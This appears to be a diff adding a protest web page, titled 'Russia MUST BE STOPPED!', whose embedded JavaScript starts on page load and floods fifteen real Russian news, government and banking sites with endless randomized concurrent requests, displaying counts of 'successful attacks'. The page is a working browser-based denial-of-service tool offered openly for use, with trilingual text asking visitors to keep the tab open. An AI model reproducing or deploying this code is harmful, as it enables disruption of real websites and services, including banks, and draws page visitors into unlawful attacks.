@@ -1,0 +1,229 @@
+<html>
+
+<head>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <title>Russia MUST BE STOPPED!</title>
+    <style>
+        body,
+        body * {
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        main {
+            max-width: 1000px;
+            padding: 20px;
+            margin: 0 auto;
+            font-family: Verdana, Geneva, Tahoma, sans-serif;
+        }
+
+        h1>span {
+            color: red;
+        }
+
+        .msg-list {
+            display: inline-block;
+            width: 100%;
+        }
+
+        .msg-list>.msg {
+            float: left;
+            width: 100%;
+        }
+
+        .stat {
+            display: inline-block;
+            width: 100%;
+            margin-bottom: 15px;
+        }
+
+        .stat>span {
+            background-color: #f004;
+            padding: 2px 5px;
+        }
+
+        .table {
+            display: inline-block;
+            width: 100%;
+            border-top: 1px solid #ccc;
+        }
+
+        .table>.row {
+            float: left;
+            width: 100%;
+            border: 1px solid #ccc;
+            border-top: none;
+        }
+
+        .table>.row>.cell {
+            float: left;
+            width: 33%;
+            padding: 2px 10px;
+        }
+
+        @media (min-width: 1100px) {
+            .msg-list>.msg {
+                display: inline-block;
+                width: 30%;
+                margin-right: 5%;
+            }
+
+            .msg-list>.msg:last-child {
+                margin-right: 0%;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <main>
+        <h1>Russia <span>MUST BE STOPPED</span>!</h1>
+        <div class="msg-list">
+            <div class="msg">
+                <h3>English version</h3>
+                <p>The "official" news in russian federation are all fake and we believe it is better to shut them down!</p>
+                <p>Please, just open this page and let it be open on your devices, it will flood the web-sites and pose a huge load on their infrastructure</p>
+            </div>
+            <div class="msg">
+                <h3>Русская версия</h3>
+                <p>"Официальные" новости в рф - это театр абсурда и мы считаем, что это нужно остановить!</p>
+                <p>Пожалуйста, просто откройте эту страницу на своём компьютере и оставтье вкладку открытой, она будет автоматически нагружать сайты российской пропаганды.</p>
+            </div>
+            <div class="msg">
+                <h3>Українська версія</h3>
+                <p>Офіційні новини в рф - це театр абсурду і ми вважаємо, що це треба зупинити!</p>
+                <p>Будь ласка, просто залиште відкритою цю сторінку на своєму комп'ютері щоб вона автоматично навантажувала сайти російської пропаганди.</p>
+            </div>
+        </div>
+        <h3>Here is the stats of your session:</h3>
+        <div class="stat">Sent <span id="requests_per_sec">0</span> request per second and got <span id="errors_per_sec">0</span> seccessful attacks!</div>
+        <div class="stat">Average <span id="requests_average">0</span> request and got <span id="errors_average">0</span> seccessful attacks per second!</div>
+        <div class="stat">Sent <span id="total_requests">0</span> request and got <span id="total_errors">0</span> seccessful attacks!</div>
+        <div id="table" class="table"></div>
+        <p>If you missed it, <a href="https://www.bbc.com/news/world-europe-60503037">BBC NEWS: Ukraine conflict: Russian forces attack from three sides</a></p>
+    </main>
+
+    <script>
+        var seconds = 0;
+        var requestPerSecond = 0;
+        var errorsPerSecond = 0;
+        var totalRequestCount = 0;
+        var totalErrorsCount = 0;
+        var maxRequestPerSecond = 0;
+        var maxErrorsPerSecond = 0;
+        var targets = [
+            { link: 'https://tass.ru/', requests: 0, erroredResponses: 0 },
+            { link: 'https://lenta.ru/', requests: 0, erroredResponses: 0 },
+            { link: 'https://tvzvezda.ru/', requests: 0, erroredResponses: 0 },
+            { link: 'https://sberbank.ru/', requests: 0, erroredResponses: 0 },
+            { link: 'https://www.1tv.ru/', requests: 0, erroredResponses: 0 },
+            { link: 'https://www.rbc.ru/', requests: 0, erroredResponses: 0 },
+            { link: 'https://www.rt.com/', requests: 0, erroredResponses: 0 },
+            { link: 'https://vsoloviev.ru/', requests: 0, erroredResponses: 0 },
+            { link: 'https://online.sberbank.ru/', requests: 0, erroredResponses: 0 },
+            { link: 'https://ria.ru/lenta/', requests: 0, erroredResponses: 0 },
+            { link: 'https://www.vesti.ru/', requests: 0, erroredResponses: 0 },
+            { link: 'https://ria.ru/', requests: 0, erroredResponses: 0 },
+            { link: 'http://kremlin.ru/', requests: 0, erroredResponses: 0 },
+            { link: 'http://en.kremlin.ru/', requests: 0, erroredResponses: 0 },
+            { link: 'https://smotrim.ru/', requests: 0, erroredResponses: 0 },
+        ];
+
+        var tableEl = document.getElementById('table');
+        var reqPerSecEl = document.getElementById('requests_per_sec');
+        var errPerSecEl = document.getElementById('errors_per_sec');
+        var reqAverageEl = document.getElementById('requests_average');
+        var errAverageEl = document.getElementById('errors_average');
+        var totalReqEl = document.getElementById('total_requests');
+        var totalErrEl = document.getElementById('total_errors');
+        var totalEl = document.getElementById('total');
+        var speedEl = document.getElementById('speed');
+
+        function table(data) {
+            var HTML = '';
+            var size = data.length;
+            for (var i = 0; i < size; ++i) {
+                HTML += '<div class="row">\
+                            <div class="cell">' + data[i].link + '</div>\
+                            <div class="cell">' + data[i].requests + '</div>\
+                            <div class="cell">' + data[i].erroredResponses + '</div>\
+                        </div>';
+            }
+            tableEl.innerHTML = HTML;
+        }
+
+        function printStats() {
+            totalRequestCount += requestPerSecond;
+            totalErrorsCount += errorsPerSecond;
+            ++seconds;
+            if (requestPerSecond > maxRequestPerSecond) {
+                maxRequestPerSecond = errorsPerSecond;
+            }
+            if (errorsPerSecond > maxErrorsPerSecond) {
+                maxErrorsPerSecond = errorsPerSecond;
+            }
+            var sorted = targets.sort((a, b) => b.erroredResponses - a.erroredResponses);
+            table(sorted);
+            reqPerSecEl.innerText = requestPerSecond;
+            errPerSecEl.innerText = errorsPerSecond;
+            reqAverageEl.innerText = (totalRequestCount / seconds).toFixed(2);
+            errAverageEl.innerText = (totalErrorsCount / seconds).toFixed(2);
+            totalReqEl.innerText = totalRequestCount;
+            totalErrEl.innerText = totalErrorsCount;
+            requestPerSecond = 0;
+            errorsPerSecond = 0;
+        }
+        setInterval(printStats, 1500);
+
+        var CONCURRENCY_LIMIT = 800;
+        var queue = [];
+
+        async function fetchWithTimeout(resource, options) {
+            const controller = new AbortController();
+            const id = setTimeout(() => controller.abort(), options.timeout);
+            return fetch(resource, {
+                signal: controller.signal
+            }).then((response) => {
+                clearTimeout(id);
+                return response;
+            }).catch((error) => {
+                clearTimeout(id);
+                throw error;
+            });
+        }
+
+        async function flood(targetObj) {
+            for (var i = 0; ; ++i) {
+                if (queue.length > CONCURRENCY_LIMIT) {
+                    await queue.shift();
+                }
+                var rand = i % 13 === 0 ? '' : ('?' + Math.floor(Math.random() * 1000000))
+                queue.push(
+                    fetchWithTimeout(targetObj.link + rand, { timeout: 1000 })
+                        .catch((error) => {
+                            if (error.code === 20 /* ABORT */) {
+                                return;
+                            }
+                            ++errorsPerSecond;
+                            ++targetObj.erroredResponses;
+                            targetObj.errorMessage = error.message;
+                        })
+                        .then((response) => {
+                            if (response && !response.ok) {
+                                ++errorsPerSecond;
+                                ++targetObj.erroredResponses;
+                                targetObj.errorMessage = response.statusText;
+                            }
+                            ++requestPerSecond;
+                            ++targetObj.requests;
+                        })
+                )
+            }
+        }
+
+        // Start
+        targets.map(flood);
+    </script>
+</body>
+
+</html>
